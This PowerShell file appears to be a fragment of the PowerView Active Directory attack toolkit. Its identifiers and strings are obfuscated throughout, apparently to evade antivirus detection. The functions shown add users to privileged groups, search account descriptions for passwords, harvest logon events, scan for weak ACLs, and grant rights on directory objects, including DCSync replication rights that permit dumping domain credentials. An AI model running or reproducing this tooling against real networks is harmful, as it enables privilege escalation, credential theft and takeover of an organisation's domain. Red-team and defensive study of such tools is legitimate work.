            ('['+'*] '+'Use'+'r '+"$UserName "+'success'+'fu'+'l'+'ly '+'adde'+'d '+'to'+' '+'g'+'roup '+"$GroupName "+'in'+' '+'doma'+'i'+'n '+"$Domain")
        }
        
        else {
            &("{3}{0}{2}{1}{4}" -f 'tGr','u','o','Add-Ne','pUser') -UserName ${U`sER`N`AMe} -GroupName ${g`R`ouPNAME} -ComputerName ${CO`mpUt`er`N`AmE}
            ('[*'+'] '+'U'+'ser '+"$UserName "+'s'+'uccess'+'ful'+'ly '+'a'+'dded '+'to'+' '+'gr'+'oup '+"$GroupName "+'on'+' '+'host'+' '+"$ComputerName")
        }
    }
}


function a`DD`-NeTGR`OupUser {


    [CmdletBinding()]
    param(
        [Parameter(manDaToRy = ${TR`UE})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${Us`ER`NAMe},

        [Parameter(mANdaToRy = ${tR`Ue})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${gRoU`PNA`Me},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{0}"-f 'me','H','ostNa'})]
        [String]
        ${cOMP`UTe`RNA`ME},

        [String]
        ${doma`in}
    )

    
    &("{2}{0}{1}" -f'-Typ','e','Add') -AssemblyName ("{7}{8}{4}{10}{5}{6}{2}{3}{0}{1}{9}" -f's.Acc','ountMana','ic','e','tem.D','r','yServ','S','ys','gement','irecto')

    
    if(${Co`mP`UTE`RN`AME} -and (${COMp`U`Te`RN`AmE} -ne ("{1}{0}{2}"-f'lho','loca','st'))) {
        try {
            &("{0}{2}{1}"-f 'Write-V','se','erbo') ('Adding'+' '+'use'+'r '+"$UserName "+'t'+'o '+"$GroupName "+'o'+'n '+'ho'+'st '+"$ComputerName")
            ([ADSI]"WinNT://$ComputerName/$GroupName,group").("{0}{1}"-f 'ad','d').Invoke("WinNT://$ComputerName/$UserName,user")
            ('['+'*] '+'Use'+'r '+"$UserName "+'su'+'ccessful'+'ly '+'ad'+'ded '+'to'+' '+'gro'+'up '+"$GroupName "+'o'+'n '+"$ComputerName")
        }
        catch {
            &("{2}{0}{4}{3}{1}" -f 'r','rning','W','-Wa','ite') ('[!]'+' '+'Error'+' '+'a'+'dding '+'use'+'r '+"$UserName "+'to'+' '+'gro'+'up '+"$GroupName "+'on'+' '+"$ComputerName")
            return
        }
    }

    
    else {
        try {
            if (${D`Om`AiN}) {
                &("{1}{2}{0}"-f'se','Write','-Verbo') ('Ad'+'ding '+'u'+'ser '+"$UserName "+'to'+' '+"$GroupName "+'o'+'n '+'doma'+'in '+"$Domain")
                ${cT} = [System.DirectoryServices.AccountManagement.ContextType]::"D`oMAin"
                ${dOm`AinO`B`JEct} = &("{3}{1}{2}{0}" -f'tDomain','et','-Ne','G') -Domain ${D`OMA`IN}
                if(-not ${DOm`AI`NobJ`ECT}) {
                    return ${nu`Ll}
                }
                
                ${cO`N`TExT} = &("{0}{2}{1}" -f 'N','ct','ew-Obje') -TypeName ("{7}{2}{3}{5}{11}{4}{1}{6}{9}{10}{0}{8}" -f 'alC','es.Account','m.Dire','ct','c','ory','Mana','Syste','ontext','gement.','Princip','Servi') -ArgumentList ${C`T}, ${D`O`MA`i`NObJeCt}            
            }
            else {
                
                &("{2}{0}{1}" -f 'te-Verbo','se','Wri') ('Addin'+'g '+'user'+' '+"$UserName "+'to'+' '+"$GroupName "+'on'+' '+'l'+'ocal'+'host')
                ${C`OntexT} = &("{2}{1}{0}"-f't','-Objec','New') ("{3}{14}{11}{8}{10}{9}{16}{2}{0}{15}{13}{12}{4}{6}{7}{1}{5}"-f'untM','ipalConte','o','S','nt.Pr','xt','i','nc','ecto','erv','ryS','stem.Dir','geme','a','y','an','ices.Acc')([System.DirectoryServices.AccountManagement.ContextType]::"M`A`chiNe", ${ENv:C`o`MpUT`eRnAmE})
            }

            
            ${G`RO`UP} = [System.DirectoryServices.AccountManagement.GroupPrincipal]::("{2}{1}{0}"-f 'ty','ti','FindByIden').Invoke(${Co`NteXt},${g`R`Oup`NamE})

            
            ${gro`Up}."me`mB`eRS"."A`dD"(${C`oN`TeXt}, [System.DirectoryServices.AccountManagement.IdentityType]::"sam`AcCOU`Ntname", ${use`RnAmE})

            
            ${G`R`oUP}.("{1}{0}"-f 'ave','S').Invoke()
        }
        catch {
            &("{2}{1}{0}"-f 'ng','rni','Write-Wa') ('Error'+' '+'adding'+' '+"$UserName "+'to'+' '+"$GroupName "+': '+"$_")
        }
    }
}


function Get-USeRpr`oP`Er`TY {


    [CmdletBinding()]
    param(
        [String[]]
        ${PR`Oper`T`Ies},

        [String]
        ${Do`ma`in},
        
        [String]
        ${DoMA`INCO`N`T`RolLER},

        [ValidateRange(1,10000)] 
        [Int]
        ${Pa`G`eSiZe} = 200
    )

    if(${Pr`oPe`RtIEs}) {
        
        ${PR`opERT`i`eS} = ,("{0}{1}" -f 'n','ame') + ${PRopE`RT`i`eS}
        &("{1}{2}{0}" -f'ser','G','et-NetU') -Domain ${D`OMAIn} -DomainController ${dOMaInCONt`R`oL`lEr} -PageSize ${p`A`Gesize} | &("{3}{2}{0}{1}" -f 'O','bject','elect-','S') -Property ${pRO`Pe`Rti`Es}
    }
    else {
        
        &("{0}{1}{3}{2}"-f'G','et','tUser','-Ne') -Domain ${D`o`mAiN} -DomainController ${doM`A`in`cOnT`RoLlEr} -PageSize ${p`A`gEsIze} | &("{3}{2}{0}{1}"-f'le','ct-Object','e','S') -First 1 | &("{0}{3}{2}{1}"-f 'Get-','er','b','Mem') -MemberType ("{1}{0}{2}" -f 'rope','*P','rty') | &("{2}{0}{1}" -f'ect-O','bject','Sel') -Property ("{0}{1}"-f'Na','me')
    }
}


function fIN`D`-USERFIELd {


    [CmdletBinding()]
    param(
        [Parameter(positION=0,ValueFRomPipElINe=${T`Rue})]
        [String]
        ${sEA`RchT`e`RM} = ("{1}{0}" -f 'ss','pa'),

        [String]
        ${S`EaRC`HF`IeLD} = ("{0}{1}{2}"-f'descript','io','n'),

        [String]
        ${ADSp`AtH},

        [String]
        ${D`omaiN},

        [String]
        ${D`oMAI`NCONT`ROlleR},

        [ValidateRange(1,10000)] 
        [Int]
        ${Pa`ge`siZE} = 200
    )

    process {
        &("{3}{2}{0}{1}" -f 't-','NetUser','e','G') -ADSpath ${aD`spA`Th} -Domain ${d`OM`AIn} -DomainController ${dom`AI`NC`OnT`RO`llEr} -Filter "($SearchField=*$SearchTerm*)" -PageSize ${pagE`sI`zE} | &("{4}{0}{2}{1}{3}" -f'elec','-Obje','t','ct','S') ("{1}{0}{2}" -f'untna','samacco','me'),${S`eA`RC`HfiELd}
    }
}


function gEt`-Us`ere`V`eNT {


    Param(
        [String]
        ${CO`mPU`TerN`A`Me} = ${E`Nv:c`oM`puTERNaME},

        [String]
        [ValidateSet({"{1}{0}" -f 'on','log'},"tgt","all")]
        ${ev`EntTy`PE} = ("{0}{1}"-f'l','ogon'),

        [DateTime]
        ${DaT`eST`A`RT}=  (  &("{0}{1}" -f 'ItE','m') ('VAR'+'i'+'Able:5M'+'bI')).vaLUe::"ToD`Ay".("{1}{0}"-f'dDays','Ad').Invoke(-5)
    )

    if(${ev`eNtt`y`PE}.("{0}{2}{1}"-f'To','er','Low').Invoke() -like ("{1}{0}"-f'ogon','l')) {
        [Int32[]]${i`D} = @(4624)
    }
    elseif(${EvENT`T`Y`PE}.("{0}{1}"-f'ToLow','er').Invoke() -like "tgt") {
        [Int32[]]${i`D} = @(4768)
    }
    else {
        [Int32[]]${id} = @(4624, 4768)
    }

    
    &("{0}{3}{2}{1}" -f 'Get-','t','en','WinEv') -ComputerName ${C`Omp`Ut`eRnA`ME} -FilterHashTable @{ ("{0}{1}{2}"-f'Log','Nam','e') = ("{2}{1}{0}"-f'rity','cu','Se'); ('ID')=${i`d}; ("{0}{1}" -f'Sta','rtTime')=${DaTeSt`A`Rt}} -ErrorAction ("{1}{3}{2}{0}"-f'tinue','Sile','yCon','ntl') | &("{0}{2}{3}{1}"-f 'F','ct','orE','ach-Obje') {

        if(${i`d} -contains 4624) {    
            
            if(${_}."MEs`sAge" -match ((("{2}{9}{8}{6}{1}{4}{10}{7}{5}{3}{0}"-f'ogon:))','Typ','(?s)(?<=Lo','on Level:wdhNew L','e:)','ersonati',' ','mp','n','go','.*?(?=(I'))."REp`la`Ce"('wdh',[STrIng][chaR]124))) {
                if(${MAt`CHES}) {
                    ${LO`gon`TyPe} = ${mAt`Ch`eS}[0].("{0}{1}"-f 'tri','m').Invoke()
                    ${M`ATchEs} = ${n`ULL}
                }
            }
            else {
                ${LOGO`N`Type} = ""
            }

            
            if ((${Log`oN`T`ypE} -eq 2) -or (${L`og`o`NTypE} -eq 3)) {
                try {
                    
                    if(${_}."Me`S`SAGE" -match (("{10}{5}{6}{8}{9}{7}{11}{3}{0}{4}{2}{1}{12}" -f'o',' Informati','s','r','ces','=N','e',').*?(','w Logo','n:','(?s)(?<','?=P','on:)'))) {
                        if(${mA`Tc`heS}) {
                            ${U`s`ernAMe} = ${MA`TcH`es}[0].("{1}{0}" -f'it','spl').Invoke("`n")[2].("{0}{1}" -f 'sp','lit').Invoke(":")[1].("{0}{1}" -f 't','rim').Invoke()
                            ${do`mAIN} = ${MA`TC`HES}[0].("{0}{1}" -f 'spli','t').Invoke("`n")[3].("{0}{1}"-f 'sp','lit').Invoke(":")[1].("{0}{1}"-f't','rim').Invoke()
                            ${M`AtcHEs} = ${NU`LL}
                        }
                    }
                    if(${_}."me`ssAgE" -match (("{7}{4}{6}{1}{3}{5}{0}{2}"-f 'on:).*?(','rm','?=Source Port:)','at','<=N','i','etwork Info','(?s)(?'))) {
                        if(${mat`C`HES}) {
                            ${A`dDREss} = ${ma`T`CHeS}[0].("{0}{1}"-f'spli','t').Invoke("`n")[2].("{0}{1}"-f'sp','lit').Invoke(":")[1].("{1}{0}"-f'rim','t').Invoke()
                            ${mA`TcHeS} = ${n`Ull}
                        }
                    }

                    
                    if (${USER`N`AME} -and (-not ${U`Sern`AME}.("{0}{1}{2}" -f 'e','nds','With').Invoke('$')) -and (${USe`Rn`AMe} -ne ("{4}{3}{2}{0}{1}" -f 'S LOG','ON','YMOU','NON','A'))) {
                        ${logonE`Vent`p`Ro`per`Ties} = @{
                            ("{0}{1}" -f'Doma','in') = ${d`o`maIn}
                            ("{3}{1}{2}{0}" -f'ame','mpute','rN','Co') = ${C`Ompu`TeR`NAME}
                            ("{1}{2}{0}" -f 'me','User','na') = ${u`SerN`AME}
                            ("{1}{0}{2}"-f 's','Addre','s') = ${Ad`DRESs}
                            'ID' = ("{0}{1}" -f '462','4')
                            ("{2}{0}{1}" -f'on','Type','Log') = ${l`Og`ontYpe}
                            ("{0}{1}" -f 'Tim','e') = ${_}."ti`meCr`eaT`ed"
                        }
                        &("{1}{2}{0}"-f'bject','N','ew-O') -TypeName ("{2}{1}{0}" -f'ct','je','PSOb') -Property ${Lo`gO`Ne`V`en`T`PropERties}
                    }
                }
                catch {
                    &("{2}{0}{1}" -f 'ite-Deb','ug','Wr') ('Er'+'ror '+'pars'+'ing'+' '+'even'+'t '+'l'+'ogs: '+"$_")
                }
            }
        }
        if(${ID} -contains 4768) {
            
            try {
                if(${_}."M`e`sSaGe" -match (("{2}{0}{4}{10}{1}{7}{3}{6}{8}{5}{9}" -f'?s)(?<=Ac','rma','(','?','count','a','(?=Service Info','tion:).*','rm','tion:)',' Info'))) {
                    if(${m`ATCH`Es}) {
                        ${uSEr`N`AMe} = ${MaT`C`heS}[0].("{1}{0}"-f 'lit','sp').Invoke("`n")[1].("{0}{1}"-f'sp','lit').Invoke(":")[1].("{1}{0}" -f'im','tr').Invoke()
                        ${Do`M`AiN} = ${mAT`cHES}[0].("{0}{1}" -f 'spli','t').Invoke("`n")[2].("{1}{0}"-f 't','spli').Invoke(":")[1].("{0}{1}" -f't','rim').Invoke()
                        ${M`AtchEs} = ${NU`ll}
                    }
                }

                if(${_}."meS`s`AGE" -match (("{7}{1}{10}{6}{8}{3}{11}{9}{0}{5}{2}{4}" -f 'n','?s)(?<=N','nformatio','ation:).*?(','n:)','al I','Infor','(','m','Additio','etwork ','?='))) {
                    if(${mAt`ch`Es}) {
                        ${aDdr`E`Ss} = ${m`ATCH`ES}[0].("{0}{1}" -f'sp','lit').Invoke("`n")[1].("{0}{1}" -f 'spli','t').Invoke(":")[-1].("{1}{0}"-f 'im','tr').Invoke()
                        ${m`Atc`hEs} = ${n`UlL}
                    }
                }

                ${lOg`ONE`V`EnTPROpE`Rti`es} = @{
                    ("{1}{0}"-f 'ain','Dom') = ${Do`MA`IN}
                    ("{0}{1}{2}{3}"-f 'Com','puter','N','ame') = ${CO`mPuTERN`AMe}
                    ("{0}{1}" -f 'Usernam','e') = ${US`Er`Name}
                    ("{1}{0}{2}" -f 'ddre','A','ss') = ${Ad`DReSs}
                    'ID' = ("{1}{0}" -f'68','47')
                    ("{1}{2}{0}"-f 'Type','L','ogon') = ''
                    ("{1}{0}" -f'e','Tim') = ${_}."TImEcRE`A`T`ED"
                }

                &("{1}{2}{0}" -f 'ct','New-O','bje') -TypeName ("{0}{1}" -f 'PSObj','ect') -Property ${LogoN`e`V`EntpRop`ER`TiES}
            }
            catch {
                &("{1}{2}{3}{0}"-f 'ug','Writ','e-D','eb') ('Error'+' '+'p'+'arsi'+'ng '+'e'+'vent '+'l'+'ogs: '+"$_")
            }
        }
    }
}


function GeT-O`B`JEcTacL {


    [CmdletBinding()]
    Param (
        [Parameter(VaLuEFrOmpIPeline=${t`Rue})]
        [String]
        ${sa`MAcc`ouN`TN`AMe},

        [String]
        ${Na`me} = "*",

        [Alias('DN')]
        [String]
        ${DIS`TI`Ng`UiSHE`DNAMe} = "*",

        [Switch]
        ${RESOlvE`gui`Ds},

        [String]
        ${Fi`lT`Er},

        [String]
        ${a`dsp`Ath},

        [String]
        ${A`DSPre`Fix},

        [String]
        [ValidateSet("All",{"{0}{1}{2}" -f 'Rese','tPas','sword'},{"{1}{2}{0}{3}" -f'Memb','W','rite','ers'})]
        ${riGHtSfI`l`T`eR},

        [String]
        ${d`OMaIN},

        [String]
        ${dOmAincO`N`Tro`lLer},

        [ValidateRange(1,10000)] 
        [Int]
        ${pA`gesi`ZE} = 200
    )

    begin {
        ${s`EARcH`eR} = &("{2}{1}{4}{5}{0}{3}"-f'arche','t-Dom','Ge','r','a','inSe') -Domain ${DO`M`AIN} -DomainController ${dOmainc`o`N`TRoL`ler} -ADSpath ${Adsp`A`Th} -ADSprefix ${ad`spR`EFIx} -PageSize ${pA`gE`SizE}

        
        if(${r`eSOlVeG`UIDS}) {
            ${gu`ids} = &("{3}{0}{1}{2}"-f '-G','UIDMa','p','Get') -Domain ${Dom`AIn} -DomainController ${D`oM`AIn`cON`TROLLer} -PageSize ${Pag`e`SIZe}
        }
    }

    process {

        if (${seA`RC`Her}) {

            if(${Sam`Ac`cOUNTna`Me}) {
                ${SeaRC`H`er}."FIlt`ER"="(&(samaccountname=$SamAccountName)(name=$Name)(distinguishedname=$DistinguishedName)$Filter)"  
            }
            else {
                ${sEA`R`cher}."FI`LTeR"="(&(name=$Name)(distinguishedname=$DistinguishedName)$Filter)"  
            }
  
            try {
                ${Se`ArC`hEr}.("{1}{0}"-f 'll','FindA').Invoke() | &("{2}{1}{0}"-f'-Object','here','W') {${_}} | &("{0}{2}{1}{3}" -f'Fo','ach-O','re','bject') {
                    ${O`B`JeCT} = [adsi](${_}."P`Ath")
                    if(${OBj`e`CT}."dis`TIN`GUI`SHED`Na`mE") {
                        ${acC`eSS} = ${O`B`jEcT}."PS`BASe"."OBJ`e`CtSEc`UrI`TY"."Ac`CEsS"
                        ${A`C`cESS} | &("{1}{2}{0}"-f'ch-Object','ForE','a') {
                            ${_} | &("{1}{2}{0}"-f'r','Add-M','embe') ("{2}{0}{3}{1}" -f'otePr','rty','N','ope') ("{0}{1}{2}" -f 'Ob','j','ectDN') (${OB`j`EcT}."DiS`T`InGUISh`e`D`NAMe"[0])

                            if(${OB`jE`ct}."o`B`jeCtsiD"[0]){
                                ${S} = (&("{2}{3}{0}{1}" -f 'ec','t','N','ew-Obj') ("{5}{11}{3}{2}{1}{7}{10}{9}{4}{0}{8}{6}" -f 'y','nci','i','Security.Pr','it','Syste','ifier','pal.Se','Ident','r','cu','m.')(${ob`J`eCt}."o`Bj`Ectsid"[0],0))."VaL`UE"
                            }
                            else {
                                ${S} = ${NU`ll}
                            }
                            
                            ${_} | &("{3}{1}{2}{0}"-f 'r','b','e','Add-Mem') ("{2}{0}{1}" -f 'te','Property','No') ("{0}{1}"-f'Obje','ctSID') ${s}
                            ${_}
                        }
                    }
                } | &("{2}{3}{1}{0}" -f '-Object','rEach','F','o') {
                    if(${r`IGht`sfIlter}) {
                        ${Gu`idfi`LTer} = Switch (${RiGhTs`F`Il`Ter}) {
                            ("{0}{2}{1}{3}"-f 'Re','r','setPasswo','d') { ("{8}{1}{7}{3}{6}{0}{5}{4}{2}" -f '0','-246','29','-11d','06e05','0aa0','0-a768-','d','00299570') }
                            ("{0}{1}{2}" -f 'Writ','eMember','s') { ("{1}{4}{5}{2}{3}{6}{0}{7}{8}" -f '0-a28','bf9','9c0','-0de6-','6','7','11d','5-00aa0','03049e2') }
                            ("{1}{0}{2}"-f'u','Defa','lt') { ("{2}{1}{3}{6}{0}{5}{4}"-f'00','000000-','00','0000-','0000000','-00000','0000-00')}
                        }
                        if(${_}."oBJE`cTtY`pE" -eq ${G`U`IdfilTEr}) { ${_} }
                    }
                    else {
                        ${_}
                    }
                } | &("{0}{3}{1}{2}"-f 'For','c','t','each-Obje') {
                    if(${G`UIds}) {
                        
                        ${AC`l`prO`PeRTIes} = @{}
                        ${_}."P`S`ObjEcT"."pR`oP`ERtIeS" | &("{0}{2}{1}"-f 'ForEach-O','ect','bj') {
                            if( (${_}."N`AmE" -eq ("{2}{0}{1}" -f'ec','tType','Obj')) -or (${_}."Na`me" -eq ("{0}{3}{4}{1}{2}"-f 'Inh','tedObjectTy','pe','er','i')) ) {
                                try {
                                    ${AClP`R`OPer`TIES}[${_}."n`AmE"] = ${gU`I`dS}[${_}."VAl`Ue".("{1}{2}{0}"-f 'ring','t','oSt').Invoke()]
                                }
                                catch {
                                    ${A`clP`RopE`RT`ies}[${_}."nA`mE"] = ${_}."V`ALuE"
                                }
                            }
                            else {
                                ${AcLPR`o`P`er`Ties}[${_}."n`AMe"] = ${_}."vA`LuE"
                            }
                        }
                        &("{0}{1}{2}"-f 'New-Ob','j','ect') -TypeName ("{0}{1}" -f 'P','SObject') -Property ${AClpRop`Er`T`IES}
                    }
                    else { ${_} }
                }
            }
            catch {
                &("{3}{1}{2}{0}" -f'ng','te-','Warni','Wri') ${_}
            }
        }
    }
}


function A`Dd-`objEct`ACl {


    [CmdletBinding()]
    Param (
        [String]
        ${taRG`eTSa`mACc`OUnT`N`AME},

        [String]
        ${TA`Rgetn`A`mE} = "*",

        [Alias('DN')]
        [String]
        ${t`ARG`eTDIst`I`NgUIshEDnAme} = "*",

        [String]
        ${T`ArGET`F`ILteR},

        [String]
        ${T`ArG`eTaDS`p`ATh},

        [String]
        ${TArG`etaD`spREFIX},

        [String]
        [ValidatePattern({"{10}{5}{7}{8}{3}{6}{2}{9}{1}{4}{0}"-f'+','-[0-',']','-9]+-[0-9]+-','9]','-1-','[0-9','5-21-[','0','+','^S'})]
        ${PRIN`CiPAls`Id},

        [String]
        ${PR`I`NcIPAlnAMe},

        [String]
        ${pRInCI`pAlS`AmacCO`U`N`Tn`AME},

        [String]
        [ValidateSet("All",{"{2}{3}{0}{1}"-f'sw','ord','ResetP','as'},{"{2}{0}{1}{3}" -f 'te','M','Wri','embers'},{"{1}{0}" -f'Sync','DC'})]
        ${RIg`HTs} = "All",

        [String]
        ${rIG`h`TsguiD},

        [String]
        ${dOm`A`In},

        [String]
        ${d`om`A`i`NconTRolLer},

        [ValidateRange(1,10000)] 
        [Int]
        ${PA`gesiZE} = 200
    )

    begin {
        ${SeaR`Ch`er} = &("{0}{2}{1}{4}{3}" -f 'G','ainSear','et-Dom','er','ch') -Domain ${do`M`AIn} -DomainController ${dO`maiNCoN`Tr`OlL`eR} -ADSpath ${t`ARGe`TA`dSPAth} -ADSprefix ${Ta`RGetAdspRE`F`IX} -PageSize ${PA`G`esiZe}

        if(!${pr`iNcipA`lSID}) {
            ${P`R`iNC`Ipal} = &("{0}{1}{2}{3}"-f'Get','-ADObj','e','ct') -Domain ${DO`MAIn} -DomainController ${domA`INCO`N`TROLl`eR} -Name ${pr`InC`i`Paln`AmE} -SamAccountName ${p`Rin`ciP`AlSa`mACcOUntNAME} -PageSize ${PA`GeS`izE}
            
            if(!${p`Rin`CI`PaL}) {
                throw ("{4}{2}{3}{1}{0}{6}{5}{7}" -f'c','lving prin','ror',' reso','Er','a','ip','l')
            }
            ${Pr`in`C`ipalsiD} = ${PrI`NcIp`AL}."o`BjE`CTSID"
        }
        if(!${P`Rinc`iPALSID}) {
            throw ("{3}{2}{7}{4}{0}{6}{1}{5}"-f's','ncipa','rr','E','e','l','olving pri','or r')
        }
    }

    process {

        if (${sea`RcH`er}) {

            if(${tArG`e`Ts`AMa`cCoU`Ntname}) {
                ${seA`Rc`her}."fI`lTeR"="(&(samaccountname=$TargetSamAccountName)(name=$TargetName)(distinguishedname=$TargetDistinguishedName)$TargetFilter)"  
            }
            else {
                ${sEA`Rch`eR}."fIL`Ter"="(&(name=$TargetName)(distinguishedname=$TargetDistinguishedName)$TargetFilter)"  
            }
  
            try {
                ${se`ARCH`er}.("{0}{1}" -f 'FindAl','l').Invoke() | &("{1}{3}{2}{0}"-f'e-Object','W','r','he') {${_}} | &("{2}{1}{0}{3}" -f 'each-','or','F','Object') {
                    

                    ${T`ArGET`DN} = ${_}."pR`OPe`RtI`es"."d`ISTIn`Gu`ISHE`DNAME"

                    ${Ide`Nti`TY} = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]${PriN`CipalS`ID})
                    ${i`Nh`E`Ritan`cetYpe} = [System.DirectoryServices.ActiveDirectorySecurityInheritance] ("{0}{1}"-f 'Non','e')
                    ${C`oNtRo`L`TypE} = [System.Security.AccessControl.AccessControlType] ("{1}{0}" -f'w','Allo')
                    ${AC`es} = @()

                    if(${rIght`s`G`UID}) {
                        ${gui`DS} = @(${RIGHTs`g`UId})
                    }
                    else {
                        ${G`Uids} = Switch (${rig`Hts}) {
                            
                            ("{1}{2}{0}"-f 'rd','Res','etPasswo') { ("{1}{6}{4}{0}{3}{7}{2}{5}" -f'246d-','00299','0aa006e','11d0','-','0529','570','-a768-0') }
                            
                            ("{1}{0}{2}{3}" -f'ite','Wr','M','embers') { ("{1}{8}{5}{6}{4}{2}{3}{0}{7}"-f'03','b','5-00','aa0','8','1d0-a','2','049e2','f9679c0-0de6-1') }
                            
                            
                            
                            
                            ("{1}{0}{2}"-f 'CSyn','D','c') { ("{4}{2}{1}{0}{3}{5}" -f'-11d1-f79f-00c0','1f6aa-9c07','13','4f','1','c2dcd2'), ("{1}{7}{9}{6}{2}{4}{5}{10}{3}{8}{0}"-f 'dcd2','1','07','04f','-11d','1-f79f-','9c','13','c2','1f6ad-','00c'), ("{2}{4}{3}{0}{7}{5}{6}{1}{8}{9}" -f'-4c62','a-0f','89','5b76-444d','e9','99','1','-','acb','eda640c')}
                        }
                    }

                    if(${g`UiDs}) {
                        foreach(${gU`iD} in ${g`UI`Ds}) {
                            ${N`ewgu`ID} = &("{1}{2}{0}" -f'bject','New-','O') ("{1}{0}" -f 'uid','G') ${Gu`ID}
                            ${ad`R`Ig`hts} = [System.DirectoryServices.ActiveDirectoryRights] ("{0}{1}{2}"-f'Extende','d','Right')
                            ${AC`eS} += &("{1}{0}{2}"-f 'e','N','w-Object') ("{1}{4}{10}{7}{8}{5}{3}{0}{2}{9}{6}"-f'iveDirectoryAcce','System.D','s','.Act','irecto','es','e','y','Servic','sRul','r') ${id`ENT`Ity},${ADr`IgH`Ts},${c`ontRo`LTYPe},${N`EW`gUid},${i`NHeRi`Tan`C`ETyPe}
                        }
                    }
                    else {
                        
                        ${A`DR`ightS} = [System.DirectoryServices.ActiveDirectoryRights] ("{0}{1}{2}" -f 'Gener','ic','All')
                        ${ac`Es} += &("{2}{1}{0}{3}"-f 'w-','e','N','Object') ("{6}{8}{2}{0}{4}{5}{7}{3}{1}"-f'rectoryServices.A','ectoryAccessRule','.Di','eDir','ct','i','Syste','v','m') ${id`EN`TITY},${AD`R`iG`HTS},${Con`T`RoLt`YpE},${InheRi`TanC`eT`ype}
                    }

                    &("{1}{3}{0}{2}"-f'e','W','-Verbose','rit') "Granting principal $PrincipalSID '$Rights' on $($_.Properties.distinguishedname) "

                    try {
                        
                        ForEach (${a`Ce} in ${A`CeS}) {
                            &("{0}{3}{1}{2}"-f 'Writ','erbo','se','e-V') "Granting principal $PrincipalSID '$($ACE.ObjectType)' rights on $($_.Properties.distinguishedname) "
                            ${Obj`E`Ct} = [adsi](${_}."p`ATH")
                            ${oBje`CT}."pSB`A`SE"."O`B`JeCt`sEcURiTY".("{4}{1}{3}{2}{0}"-f'ule','A','R','ccess','Add').Invoke(${A`ce})
                            ${obj`eCT}."Psb`A`SE".("{2}{0}{4}{3}{1}" -f'i','anges','comm','ch','t').Invoke()
                        }
                    }
                    catch {
                        &("{1}{2}{0}" -f 'arning','Write-','W') ('E'+'rr'+'or '+'gran'+'ti'+'ng '+'p'+'rincip'+'al '+"$PrincipalSID "+"'$Rights' "+'o'+'n '+"$TargetDN "+': '+"$_")
                    }
                }
            }
            catch {
                &("{0}{2}{1}" -f'W','arning','rite-W') ('E'+'r'+'ror: '+"$_")
            }
        }
    }
}


function i`N`V`OKE-aClSc`Anner {


    [CmdletBinding()]
    Param (
        [Parameter(vaLueFrOMPipelIne=${t`RUE})]
        [String]
        ${SamAcco`U`NTN`A`me},

        [String]
        ${N`AmE} = "*",

        [Alias('DN')]
        [String]
        ${DIST`IngU`ished`N`Ame} = "*",

        [String]
        ${fILt`er},

        [String]
        ${ADS`p`AtH},

        [String]
        ${AD`sp`R`eFix},

        [String]
        ${d`o`mAIN},

        [String]
        ${doma`inC`ont`R`OL`LeR},

        [Switch]
        ${rE`Sol`VEGuIdS},

        [ValidateRange(1,10000)] 
        [Int]
        ${paG`EsIZe} = 200
    )

    
    &("{3}{1}{4}{0}{2}"-f 'A','-Obje','CL','Get','ct') @PSBoundParameters | &("{2}{1}{0}{3}"-f 'E','r','Fo','ach-Object') {
        
        ${_} | &("{1}{2}{0}" -f'ber','Add','-Mem') ("{3}{1}{2}{0}"-f'operty','ote','pr','N') ("{2}{0}{1}" -f'dentit','ySID','I') (${_}."idEN`Ti`TY`REfERencE"."tra`Ns`LAte"([System.Security.Principal.SecurityIdentifier])."vAl`UE")
        ${_}
    } | &("{2}{0}{1}{3}" -f 'e','-O','Wher','bject') {
        
        try {
            [int](${_}."IDENTIT`y`siD".("{0}{1}" -f'spl','it').Invoke("-")[-1]) -ge 1000
        }
        catch {}
    } | &("{2}{0}{1}" -f 'je','ct','Where-Ob') {
        
        (${_}."AC`TIvEdi`R`eCt`Or`yRiGHTs" -eq ("{1}{2}{0}" -f'll','Gene','ricA')) -or (${_}."A`cT`ivEdi`ReCtOR`Y`R`IgHts" -match ("{1}{0}"-f'te','Wri')) -or (${_}."acT`iv`EDirE`ctOr`yRIgHts" -match ("{1}{0}" -f 'eate','Cr')) -or (${_}."ACtiveDi`RE`ctO`RYRI`g`htS" -match ("{2}{1}{0}"-f'ete','el','D')) -or ((${_}."ACti`VED`I`ReC`TOryRI`g`hTs" -match ("{2}{1}{0}{3}"-f'dedR','ten','Ex','ight')) -and (${_}."acCESsCon`TR`o`lT`ypE" -eq ("{1}{0}" -f'llow','A')))
    }
}


function gEt-`Gu`I`DmaP {


    [CmdletBinding()]
    Param (
        [String]
        ${Dom`AIn},

        [String]
        ${DOm`AIncoN`T`RO`llEr},

        [ValidateRange(1,10000)] 
        [Int]
        ${PAG`e`Size} = 200
    )

    ${gUI`Ds} = @{("{3}{0}{1}{4}{5}{2}"-f '000','0-0','00000','0000','000-0000-0000-00000','00') = 'All'}

    ${SC`HeM`APaTH} = (&("{0}{2}{1}" -f 'Get-NetF','st','ore'))."SC`HEMa"."N`AmE"

    ${SCh`emaSear`C`h`er} = &("{1}{2}{3}{0}{4}" -f'arch','Get','-Doma','inSe','er') -ADSpath ${SChe`Mapa`Th} -DomainController ${dO`mAiNC`ONtrOl`ler} -PageSize ${PA`ge`siZe}
    if(${sCHEM`As`e`A`RCheR}) {
        ${s`ch`E`mAsEARChEr}."FiL`T`eR" = ("{0}{3}{1}{2}" -f '(','c','hemaIDGUID=*)','s')
        try {
            ${scHEmAS`ear`CHeR}.("{0}{2}{1}" -f'Fi','ll','ndA').Invoke() | &("{3}{2}{0}{1}" -f 'ere-','Object','h','W') {${_}} | &("{3}{2}{1}{0}" -f 'ct','je','Each-Ob','For') {
                
                ${gu`Ids}[(&("{2}{1}{3}{0}"-f'ect','w-','Ne','Obj') ("{1}{0}"-f'uid','G') (,${_}."pRO`p`eRTieS"."S`CH`EMaiDgu`Id"[0]))."gU`Id"] = ${_}."p`R`oPErties"."N`AME"[0]
            }
        }
        catch {
            &("{2}{0}{1}"-f 'Deb','ug','Write-') ('Error'+' '+'i'+'n '+'bui'+'ldi'+'ng '+'GUI'+'D '+'map:'+' '+"$_")
        }      
    }

